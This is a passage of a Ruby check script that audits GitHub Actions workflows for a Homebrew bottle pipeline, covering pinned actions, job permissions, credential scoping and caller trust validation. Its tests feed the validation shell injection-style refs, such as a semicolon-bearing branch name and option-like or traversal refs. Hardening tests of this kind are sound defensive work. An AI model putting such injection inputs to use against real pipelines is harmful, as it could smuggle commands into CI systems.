#!/usr/bin/env ruby
# frozen_string_literal: true

require "digest"
require "json"
require "open3"
require "tempfile"
require "yaml"

REPO_ROOT = File.expand_path("..", __dir__)
PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")
REPOSITORY_CANARY_PATH = File.join(
  REPO_ROOT, ".github/workflows/reusable-homebrew-repository-namespace-canary.yml"
)
TAP_CALLER_ROOT = File.join(REPO_ROOT, "homebrew/homebrew-tap-core/.github/workflows")
CHECKOUT_ACTION = "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"
NIX_ACTION = "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
MAGIC_NIX_ACTION = "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
UPLOAD_ACTION = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD_ACTION = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
BREW_COMMIT = "34c40c18ffa2029b611b61c73273e32c003d0842"
PUBLISHER_PLAN_DIGEST = "9a7a17e2df77b08649bc6fdc4b54eaa5a28d509484ac958876a6fca9791c5298"
PUBLISHER_BUILD_DIGEST = "5aff321eb902bb169f203c3e54db399fee85482f015adf12166920ee712df65b"
PUBLISHER_UPLOAD_DIGEST = "9d6452d17deae0c7c5914ea3eeeee76846f742c48cf7ef24dfd8319ec798a320"
PUBLISHER_INDEX_DIGEST = "be6a78a2b02f0769d072b09022f0de08afa34c2d2bf5cba8dd13ad1c22e47679"
PUBLISHER_VERIFY_DIGEST = "d66a39301c3676de788f56d8928f42a208e2db7ffb8e5a79f031d34d8a490d65"
PUBLISHER_FINALIZE_DIGEST = "ce29dbe810001b5a9ea0a570a739a5e1871d342d7eb6f54d34ebb20e516465a5"
MAINTENANCE_VALIDATE_DIGEST = "95802741a715c418fdcda9a75aa4f03a6a9248ac6ef91a24e6de173a9b6b015e"
MAINTENANCE_ROLLBACK_DIGEST = "0e7304f39b1b656fc59c3ddce48178684eab155ffd993f6e93e0b008e2ecf552"
REPOSITORY_CANARY_STEPS_DIGEST = "9cf30d889bd1bf6d0ab5b5f99e35f552d40f78f9b7dcb5fd40a07041b4c0f453"

def check(condition, message)
  raise message unless condition
end

def load_workflow(path)
  workflow = YAML.safe_load_file(path, aliases: false)
  check(workflow.is_a?(Hash), "#{File.basename(path)} is not a workflow mapping")
  workflow
end

def workflow_events(workflow)
  events = workflow.key?("on") ? workflow["on"] : workflow[true]
  check(events.is_a?(Hash), "workflow on: value is not a mapping")
  events
end

def values_for_key(node, wanted, values = [])
  case node
  when Hash
    node.each do |key, value|
      values << value if key.to_s == wanted
      values_for_key(value, wanted, values)
    end
  when Array
    node.each { |value| values_for_key(value, wanted, values) }
  end
  values
end

def deep_copy(value)
  Marshal.load(Marshal.dump(value))
end

def canonical_contract(value)
  case value
  when Hash
    value.keys.sort_by(&:to_s).to_h do |key|
      [key.to_s, canonical_contract(value.fetch(key))]
    end
  when Array
    value.map { |entry| canonical_contract(entry) }
  else
    value
  end
end

def contract_digest(value)
  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(value)))
end

def workflow_jobs(workflow)
  jobs = workflow["jobs"]
  check(jobs.is_a?(Hash), "workflow jobs: value is not a mapping")
  jobs
end

def job_steps(job, label)
  steps = job["steps"]
  check(steps.is_a?(Array), "#{label} steps: value is not an array")
  check(steps.all? { |step| step.is_a?(Hash) }, "#{label} contains a non-mapping step")
  steps
end

def named_step(steps, name)
  matches = steps.select { |step| step["name"] == name }
  check(matches.length == 1, "expected exactly one #{name.inspect} step")
  matches.first
end

def caller_validation_result(source, overrides = {})
  env = {
    "CALLER_EVENT_NAME" => "repository_dispatch",
    "CALLER_REF" => "refs/heads/main",
    "CALLER_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/dry-run-bottles.yml@refs/heads/main",
    "DRY_RUN" => "true",
    "KANDELO_REPOSITORY" => "Automattic/kandelo",
    "KANDELO_REF" => "main",
    "TAP_NAME" => "kandelo-dev/tap-core",
    "TAP_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "TAP_REF" => "main",
    "BOTTLE_ROOT_URL" => "",
  }.merge(overrides)

  Tempfile.create("kandelo-homebrew-trust-output") do |output|
    env["GITHUB_OUTPUT"] = output.path
    stdout, stderr, status = Open3.capture3(
      env, "bash", "--noprofile", "--norc", "-c", source
    )
    output.flush
    {
      "status" => status.exitstatus,
      "stdout" => stdout,
      "stderr" => stderr,
      "outputs" => File.read(output.path),
    }
  end
end

def maintenance_validation_result(source, overrides = {})
  env = {
    "CALLER_EVENT_NAME" => "repository_dispatch",
    "CALLER_REF" => "refs/heads/main",
    "CALLER_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/maintain-bottles.yml@refs/heads/main",
    "MODE" => "rebuild",
  }.merge(overrides)
  stdout, stderr, status = Open3.capture3(
    env, "bash", "--noprofile", "--norc", "-c", source
  )
  { "status" => status.exitstatus, "stdout" => stdout, "stderr" => stderr }
end

def check_caller_validation_behavior(workflow)
  plan_steps = job_steps(workflow_jobs(workflow).fetch("plan"), "publisher plan")
  source = named_step(plan_steps, "Validate caller trust boundary").fetch("run")

  branch = caller_validation_result(source, {
    "KANDELO_REF" => "review/homebrew_source-1.2",
    "TAP_REF" => "formula/pilot_1.2",
  })
  check(branch["status"] == 0 && branch["outputs"] ==
        "kandelo-ref=refs/heads/review/homebrew_source-1.2\n" \
        "tap-ref=refs/heads/formula/pilot_1.2\n",
        "publisher dry-run does not normalize reviewed branch names")

  kandelo_sha = "a" * 40
  tap_sha = "b" * 40
  exact = caller_validation_result(source, {
    "KANDELO_REF" => kandelo_sha,
    "TAP_REF" => tap_sha,
  })
  check(exact["status"] == 0 && exact["outputs"] ==
        "kandelo-ref=#{kandelo_sha}\ntap-ref=#{tap_sha}\n",
        "publisher dry-run does not accept exact source commits")

  data_only = caller_validation_result(source, {
    "KANDELO_REF" => "review/homebrew;still-data",
  })
  check(data_only["status"] == 0 && data_only["outputs"].include?(
          "kandelo-ref=refs/heads/review/homebrew;still-data\n"
        ), "publisher dry-run interpolates a valid source ref as shell syntax")

  mixed_case = caller_validation_result(source, {
    "CALLER_REPOSITORY" => "Kandelo-Dev/Homebrew-Tap-Core",
    "CALLER_WORKFLOW_REF" =>
      "Kandelo-Dev/Homebrew-Tap-Core/.github/workflows/dry-run-bottles.yml@refs/heads/main",
    "TAP_NAME" => "Kandelo-Dev/Tap-Core",
    "TAP_REPOSITORY" => "KANDELO-DEV/HOMEBREW-TAP-CORE",
  })
  check(mixed_case["status"] == 0 && mixed_case["outputs"] ==
        "kandelo-ref=refs/heads/main\ntap-ref=refs/heads/main\n",
        "publisher does not compare GitHub repository identities case-insensitively")

  case_variant_workflow = caller_validation_result(source, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/DRY-RUN-BOTTLES.YML@refs/heads/main",
  })
  check(case_variant_workflow["status"] == 2 &&
        case_variant_workflow["stdout"].include?(
          "dry-run publication requires the reviewed tap dry-run workflow"
        ), "publisher accepts a case-variant workflow path")

  write = caller_validation_result(source, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/publish-bottles.yml@refs/heads/main",
    "DRY_RUN" => "false",
  })
  check(write["status"] == 0 && write["outputs"] ==
        "kandelo-ref=refs/heads/main\ntap-ref=refs/heads/main\n",
        "publisher write path does not remain fixed to main")

  write_sha = caller_validation_result(source, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/publish-bottles.yml@refs/heads/main",
    "DRY_RUN" => "false",
    "KANDELO_REF" => kandelo_sha,
  })
  check(write_sha["status"] == 2 &&
        write_sha["stdout"].include?("write publication requires Kandelo main"),
        "publisher write path accepts a non-main Kandelo ref")

  {
    "fully qualified ref" => "refs/heads/review/homebrew",
    "invalid ref traversal" => "review..homebrew",
    "option-like ref" => "-review",
    "empty ref" => "",
  }.each do |label, ref|
    rejected = caller_validation_result(source, { "KANDELO_REF" => ref })
    check(rejected["status"] == 2 &&
          rejected["stderr"].include?("dry-run Kandelo ref must be a branch name or exact"),
          "publisher dry-run accepts #{label}")
  end
end

def check_architecture_aware_sysroot_step(step, label)
  check(step.keys.sort == %w[env name run shell] && step["shell"] == "bash" &&
        step["env"] == { "KANDELO_HOMEBREW_ARCH" => "${{ matrix.arch }}" },
        "#{label} sysroot mapping changed")
  run = step.fetch("run")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh" } == 1,
        "#{label} does not build the invariant wasm32 base sysroot exactly once")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix" } == 1,
        "#{label} does not build the wasm64 target sysroot exactly once")
  [
    'case "$KANDELO_HOMEBREW_ARCH" in', "wasm32) ;;", "wasm64)",
    "unsupported Kandelo Homebrew architecture", "exit 2",
  ].each do |fragment|
    check(run.include?(fragment), "#{label} architecture selection lacks #{fragment}")
  end
end

def check_sidecar_sysroot_binding(source, fingerprint_source)
  [
    'BUILD_ROOT="${KANDELO_HOMEBREW_BUILD_ROOT:-$KANDELO_ROOT}"',
    'SYSROOT_FINGERPRINT="$(bash "$KANDELO_ROOT/scripts/homebrew-sysroot-fingerprint.sh"',
    '--kandelo-root "$BUILD_ROOT" --arch "$KANDELO_HOMEBREW_ARCH")"',
    'BUILD_COMMIT="$(git -C "$BUILD_ROOT" rev-parse HEAD)"',
    'if [ "$BUILD_COMMIT" != "$KANDELO_COMMIT" ]; then',
  ].each do |fragment|
    check(source.include?(fragment), "sidecar target-sysroot binding lacks #{fragment}")
  end
  check(source.scan("SYSROOT_FINGERPRINT=").length == 1,
        "sidecar generator has more than one sysroot fingerprint source")
  [
    'wasm32) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;',
    'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
    '[ ! -f "$SYSROOT_LIBC" ] || [ -L "$SYSROOT_LIBC" ]',
    'selected $ARCH sysroot libc must be a regular non-symlink file',
    'sha256sum "$SYSROOT_LIBC"', 'shasum -a 256 "$SYSROOT_LIBC"',
  ].each do |fragment|
    check(fingerprint_source.include?(fragment),
          "sidecar sysroot fingerprint helper lacks #{fragment}")
  end
end

def check_forbidden_root_args(run, label, expected)
  actual = run.lines.filter_map do |line|
    stripped = line.strip.delete_suffix(" \\")
    stripped if stripped.start_with?("--forbidden-root ")
  end
  check(actual == expected, "#{label} forbidden-root trust mapping changed")
end

def exact_permissions?(actual, expected)
  actual.is_a?(Hash) && actual.transform_keys(&:to_s) == expected
end

def check_common(workflow, label, allowed_secret_nodes: [])
  mutable_actions = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && !value.start_with?("./") &&
      !value.match?(%r{\A[^@\s]+@[0-9a-f]{40}\z})
  end
  check(mutable_actions.empty?,
        "#{label} executes mutable action refs: #{mutable_actions.join(', ')}")

  cache_uses = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && value.downcase.match?(%r{\Aactions/cache(?:/restore)?@})
  end
  check(cache_uses.empty?, "#{label} consumes Actions cache state: #{cache_uses.join(', ')}")

  unsafe_runs = values_for_key(workflow, "run").select do |value|
    value.is_a?(String) && value.include?("${{")
  end
  check(unsafe_runs.empty?, "#{label} interpolates a GitHub expression into shell syntax")
  check(values_for_key(workflow, "secrets") == allowed_secret_nodes,
        "#{label} secret contract changed")
end

def check_tap_caller(path, expected_name:, event_type:, job_name:, reusable:, inputs:, secrets: {})
  workflow = load_workflow(path)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on], "#{File.basename(path)} has unexpected top-level configuration")
  check(workflow["name"] == expected_name, "#{File.basename(path)} name changed")
  check(workflow_events(workflow) == {
    "repository_dispatch" => { "types" => [event_type] },
  }, "#{File.basename(path)} must expose only its reviewed repository_dispatch event")
  jobs = workflow_jobs(workflow)
  check(jobs.keys == [job_name], "#{File.basename(path)} has an unexpected job set")
  job = jobs.fetch(job_name)
  expected_job_keys = %w[permissions uses with]
  expected_job_keys << "secrets" unless secrets.empty?
  check(job.keys.sort == expected_job_keys.sort,
        "#{File.basename(path)} caller job changed")
  check(exact_permissions?(job["permissions"], {
    "actions" => "read", "contents" => "write", "packages" => "write",
  }), "#{File.basename(path)} permission ceiling changed")
  check(job["uses"] == reusable, "#{File.basename(path)} reusable workflow target changed")
  check(job["with"] == inputs, "#{File.basename(path)} caller inputs changed")
  check(job.fetch("secrets", {}) == secrets, "#{File.basename(path)} caller secrets changed")
  check(values_for_key(workflow, "run").empty? && values_for_key(workflow, "steps").empty?,
        "#{File.basename(path)} may not execute caller-local steps")
  expected_secret_nodes = secrets.empty? ? [] : [secrets]
  check(values_for_key(workflow, "secrets") == expected_secret_nodes,
        "#{File.basename(path)} may pass only its reviewed named secrets")
end

def check_tap_callers
  publish_inputs = {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "kandelo-dev/homebrew-tap-core",
    "tap-name" => "kandelo-dev/tap-core",
    "tap-ref" => "main",
    "formulae" => "${{ github.event.client_payload.formulae }}",
    "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
    "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
    "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
    "force" => "${{ github.event.client_payload.force || false }}",
    "dry-run" => false,
  }
  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "publish-bottles.yml"),
    expected_name: "Publish Kandelo bottles",
    event_type: "publish-kandelo-bottles",
    job_name: "publish",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: publish_inputs,
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "dry-run-bottles.yml"),
    expected_name: "Dry run Kandelo bottles",
    event_type: "dry-run-kandelo-bottles",
    job_name: "dry-run",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: publish_inputs.merge({
      "kandelo-repository" => "${{ github.event.client_payload.kandelo_repository || 'Automattic/kandelo' }}",
      "kandelo-ref" => "${{ github.event.client_payload.kandelo_ref || 'main' }}",
      "tap-repository" => "${{ github.event.client_payload.tap_repository || 'kandelo-dev/homebrew-tap-core' }}",
      "tap-name" => "${{ github.event.client_payload.tap_name || 'kandelo-dev/tap-core' }}",
      "tap-ref" => "${{ github.event.client_payload.tap_ref || 'main' }}",
      "dry-run" => true,
    }),
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "maintain-bottles.yml"),
    expected_name: "Maintain Kandelo bottles",
    event_type: "maintain-kandelo-bottles",
    job_name: "maintain",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-maintenance.yml@main",
    inputs: {
      "mode" => "${{ github.event.client_payload.mode || 'rebuild' }}",
      "formulae" => "${{ github.event.client_payload.formulae }}",
      "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
      "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
      "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
      "force" => "${{ github.event.client_payload.force || false }}",
      "rollback-reason" => "${{ github.event.client_payload.rollback_reason || '' }}",
      "rollback-ref" => "${{ github.event.client_payload.rollback_ref || '' }}",
      "deleted-package-url" => "${{ github.event.client_payload.deleted_package_url || '' }}",
      "deletion-reason" => "${{ github.event.client_payload.deletion_reason || '' }}",
    },
  )
end

def check_repository_canary(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on],
        "repository namespace canary has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Homebrew repository namespace canary",
        "repository namespace canary name changed")

  events = workflow_events(workflow)
  check(events == {
    "workflow_call" => {
      "inputs" => {
        "kandelo-ref" => { "type" => "string", "required" => true },
      },
    },
  }, "repository namespace canary workflow_call contract changed")
  check(!workflow.key?("permissions"),
        "repository namespace canary requests workflow-wide permissions")
  check_common(workflow, "repository namespace canary")

  jobs = workflow_jobs(workflow)
  check(jobs.keys == ["canary"], "repository namespace canary job set changed")
  job = jobs.fetch("canary")
  check(job.keys.sort == %w[permissions runs-on steps timeout-minutes] &&
        job["runs-on"] == "ubuntu-latest" && job["timeout-minutes"] == 30 &&
        exact_permissions?(job["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "repository namespace canary authority changed")

  steps = job_steps(job, "repository namespace canary")
  check(contract_digest(steps) == REPOSITORY_CANARY_STEPS_DIGEST,
        "repository namespace canary step contract changed")
  check(values_for_key(workflow, "uses") == [
    CHECKOUT_ACTION, NIX_ACTION, DOWNLOAD_ACTION, UPLOAD_ACTION,
  ], "repository namespace canary action set or pins changed")

  trust = named_step(steps, "Validate exact canary caller")
  check(trust["env"] == {
    "CALLER_ACTION" => "${{ github.event.action }}",
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
  }, "repository namespace canary caller context changed")
  [
    "kandelo-dev/homebrew-tap-core",
    "refs/heads/main",
    "repository_dispatch",
    "test-repository-rooted-ghcr-package",
    "repository-namespace-canary.yml@refs/heads/main",
    '[[ "$KANDELO_REF" =~ ^[0-9a-f]{40}$ ]]',
  ].each do |fragment|
    check(trust.fetch("run").include?(fragment),
          "repository namespace canary caller validation lacks #{fragment}")
  end

  checkout = named_step(steps, "Checkout exact Kandelo canary source")
  check(checkout["uses"] == CHECKOUT_ACTION && checkout["with"] == {
    "persist-credentials" => false,
    "repository" => "Automattic/kandelo",
    "ref" => "${{ inputs.kandelo-ref }}",
    "path" => "kandelo",
    "submodules" => false,
  }, "repository namespace canary checkout changed")

  download = named_step(steps, "Download exact GITHUB_TOKEN zlib control artifact")
  check(download["uses"] == DOWNLOAD_ACTION && download["with"] == {
    "name" => "homebrew-oci-child-zlib-wasm32-attempt-1",
    "path" => "${{ runner.temp }}/homebrew-repository-namespace-canary",
    "github-token" => "${{ github.token }}",
    "repository" => "Kandelo-dev/homebrew-tap-core",
    "run-id" => 29628202419,
  }, "repository namespace canary control artifact changed")

  upload = named_step(steps, "Create exact repository-rooted package with GITHUB_TOKEN")
  check(upload["env"] == {
    "GH_TOKEN" => "${{ github.token }}",
  }, "repository namespace canary authentication changed")
  [
    "scripts/homebrew-ghcr-upload.sh",
    "--tap-repository kandelo-dev/homebrew-tap-core",
    "--tap-name kandelo-dev/tap-core",
    "--formula zlib",
    "--auth-mode github-token",
    "--require-pat false",
    "--destination-mode repository-canary",
  ].each do |fragment|
    check(upload.fetch("run").include?(fragment),
          "repository namespace canary upload lacks #{fragment}")
  end

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  credential_steps = steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(credential_steps == [upload],
        "repository namespace canary credentials escape the upload step")
end

def check_publisher(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on],
        "publisher has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
        "publisher name changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"],
        "publisher workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
    "kandelo-ref" => { "type" => "string", "default" => "main" },
    "tap-repository" => { "type" => "string", "default" => "kandelo-dev/homebrew-tap-core" },
    "tap-name" => { "type" => "string", "default" => "kandelo-dev/tap-core" },
    "tap-ref" => { "type" => "string", "default" => "main" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "bottle-root-url" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "dry-run" => { "type" => "boolean", "default" => false },
    "require-vfs-acceptance" => { "type" => "boolean", "default" => false },
  }, "publisher inputs changed")
  check(!workflow.key?("permissions"), "publisher requests workflow-wide permissions")
  check_common(workflow, "reusable publisher")
  serialized_workflow = JSON.generate(workflow)
  check(!serialized_workflow.match?(/\$\{\{\s*secrets(?:\.|\[)/),
        "publisher still accepts a caller secret")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[build-and-test finalize-tap plan publish-bottle-index upload-bottle verify-bottle],
        "publisher has an unexpected job set")
  plan = jobs.fetch("plan")
  build = jobs.fetch("build-and-test")
  upload = jobs.fetch("upload-bottle")
  index = jobs.fetch("publish-bottle-index")
  verify = jobs.fetch("verify-bottle")
  finalize = jobs.fetch("finalize-tap")

  check(plan.keys.sort == %w[outputs permissions runs-on steps],
        "publisher plan contract changed")
  %w[build-and-test upload-bottle verify-bottle finalize-tap].each do |job_name|
    check(jobs.fetch(job_name).keys.sort ==
          %w[if needs permissions runs-on steps strategy timeout-minutes],
          "publisher #{job_name} job contract changed")
  end
  check(index.keys.sort == %w[concurrency if needs permissions runs-on steps strategy timeout-minutes],
        "publisher version-index job contract changed")
  check(plan["runs-on"] == "ubuntu-latest" &&
        exact_permissions?(plan["permissions"], { "contents" => "read" }),
        "publisher plan authority changed")
  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440 &&
        exact_permissions?(build["permissions"], { "contents" => "read", "actions" => "read" }),
        "publisher build authority changed")
  check(upload["runs-on"] == "ubuntu-latest" && upload["timeout-minutes"] == 60 &&
        exact_permissions?(upload["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "publisher uploader authority changed")
  check(index["runs-on"] == "ubuntu-latest" && index["timeout-minutes"] == 60 &&
        exact_permissions?(index["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }) && index["concurrency"] == {
          "group" => "kandelo-homebrew-bottle-index-${{ inputs.tap-repository }}-${{ matrix.formula }}",
          "cancel-in-progress" => false,
        }, "publisher version-index authority or concurrency changed")
  check(verify["runs-on"] == "ubuntu-latest" && verify["timeout-minutes"] == 1440 &&
        exact_permissions?(verify["permissions"], { "actions" => "read", "contents" => "read" }),
        "publisher verifier authority changed")
  check(finalize["runs-on"] == "ubuntu-latest" && finalize["timeout-minutes"] == 120 &&
        exact_permissions?(finalize["permissions"], { "actions" => "read", "contents" => "write" }),
        "publisher finalizer authority changed")

  matrix_strategy = {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }
  [build, upload, verify, finalize].each do |job|
    check(job["strategy"] == matrix_strategy,
          "publisher execution job bypasses the validated matrix")
  end
  check(index["strategy"] == {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.formula-matrix) }}" },
  }, "publisher version-index job bypasses the validated Formula matrix")
  check(build["needs"] == ["plan"] &&
        build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
        "publisher build graph changed")
  check(upload["needs"] == %w[plan build-and-test] &&
        upload["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                         "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher upload graph or dry-run isolation changed")
  check(index["needs"] == %w[plan build-and-test upload-bottle] &&
        index["if"] == "${{ always() && !cancelled() && !inputs.dry-run && needs.plan.result == 'success' && " \
                        "needs.build-and-test.result == 'success' && needs.upload-bottle.result == 'success' && " \
                        "needs.plan.outputs.matrix != '[]' }}",
        "publisher version-index graph or dry-run isolation changed")
  check(verify["needs"] == %w[plan build-and-test upload-bottle publish-bottle-index] &&
        verify["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
                         "needs.build-and-test.result == 'success' && (inputs.dry-run || " \
                         "(needs.upload-bottle.result == 'success' && needs.publish-bottle-index.result == 'success')) && " \
                         "needs.plan.outputs.matrix != '[]' }}",
        "publisher verification graph changed")
  check(finalize["needs"] == %w[plan build-and-test upload-bottle verify-bottle] &&
        finalize["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                           "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher finalization graph or dry-run isolation changed")

  plan_steps = job_steps(plan, "publisher plan")
  build_steps = job_steps(build, "publisher build")
  upload_steps = job_steps(upload, "publisher upload")
  index_steps = job_steps(index, "publisher version index")
  verify_steps = job_steps(verify, "publisher verification")
  finalize_steps = job_steps(finalize, "publisher finalization")

  validation = named_step(plan_steps, "Validate caller trust boundary")
  check(plan_steps.first.equal?(validation), "publisher trust validation must be first")
  check(validation.keys.sort == %w[env id name run shell] && validation["id"] == "trust" &&
        validation["shell"] == "bash" &&
        validation["env"] == {
          "CALLER_EVENT_NAME" => "${{ github.event_name }}",
          "CALLER_REF" => "${{ github.ref }}",
          "CALLER_REPOSITORY" => "${{ github.repository }}",
          "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
          "TAP_NAME" => "${{ inputs.tap-name }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "TAP_REF" => "${{ inputs.tap-ref }}",
          "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
        }, "publisher caller validation mapping changed")
  validation_run = validation.fetch("run")
  [
    'normalized_caller_repository="$(printf \'%s\' "$CALLER_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    'normalized_tap_repository="$(printf \'%s\' "$TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    'normalized_tap_name="$(printf \'%s\' "$TAP_NAME" | tr \'[:upper:]\' \'[:lower:]\')"',
    '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    '"$CALLER_REPOSITORY/.github/workflows/dry-run-bottles.yml@refs/heads/main"',
    '"$CALLER_REPOSITORY/.github/workflows/publish-bottles.yml@refs/heads/main"',
    '"$CALLER_REPOSITORY/.github/workflows/maintain-bottles.yml@refs/heads/main"',
    '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
    '[ "$KANDELO_REF" = "main" ]',
    '[[ "$normalized_tap_repository" =~ ^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$ ]]',
    'tap_short_name="${normalized_tap_repository#*/homebrew-}"',
    '[ "$normalized_tap_name" = "${tap_owner}/${tap_short_name}" ]',
    '[ "$TAP_REF" = "main" ]',
    '[ -z "$BOTTLE_ROOT_URL" ]',
    'normalize_dry_run_source_ref()',
    '[[ "$ref" =~ ^[0-9a-f]{40}$ ]]',
    '[ "${#ref}" -le 255 ]',
    '[[ "$ref" != refs/* ]]',
    '[[ "$ref" != -* ]]',
    'git check-ref-format "refs/heads/$ref"',
    'validated_kandelo_ref="$(normalize_dry_run_source_ref "Kandelo" "$KANDELO_REF")"',
    'validated_tap_ref="$(normalize_dry_run_source_ref "tap" "$TAP_REF")"',
    'echo "kandelo-ref=$validated_kandelo_ref"',
    'echo "tap-ref=$validated_tap_ref"',
  ].each do |predicate|
    check(validation_run.include?(predicate), "publisher caller validation lacks #{predicate}")
  end
  dry_index = validation_run.index('if [ "$DRY_RUN" = "true" ]')
  caller_index = validation_run.index(
    '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]'
  )
  kandelo_index = validation_run.index('[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]')
  tap_name_index = validation_run.index(
    '[[ "$normalized_tap_repository" =~ ^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$ ]]'
  )
  dry_kandelo_ref_index = validation_run.index(
    'validated_kandelo_ref="$(normalize_dry_run_source_ref "Kandelo" "$KANDELO_REF")"'
  )
  write_kandelo_ref_index = validation_run.index('[ "$KANDELO_REF" = "main" ]')
  write_tap_ref_index = validation_run.index('[ "$TAP_REF" = "main" ]')
  check(dry_index && caller_index && kandelo_index && tap_name_index &&
        caller_index < dry_index && kandelo_index < dry_index && tap_name_index < dry_index,
        "publisher dry-run can bypass caller authority validation")
  check(dry_kandelo_ref_index && write_kandelo_ref_index && write_tap_ref_index &&
        dry_index < dry_kandelo_ref_index && dry_kandelo_ref_index < write_kandelo_ref_index &&
        dry_kandelo_ref_index < write_tap_ref_index,
        "publisher does not separate selectable dry-run refs from write-only main refs")

  vfs_selection = named_step(
    plan_steps, "Validate dependency-bearing VFS acceptance selection"
  )
  check(vfs_selection.keys.sort == %w[env name run shell] &&
        vfs_selection["shell"] == "bash" && vfs_selection["env"] == {
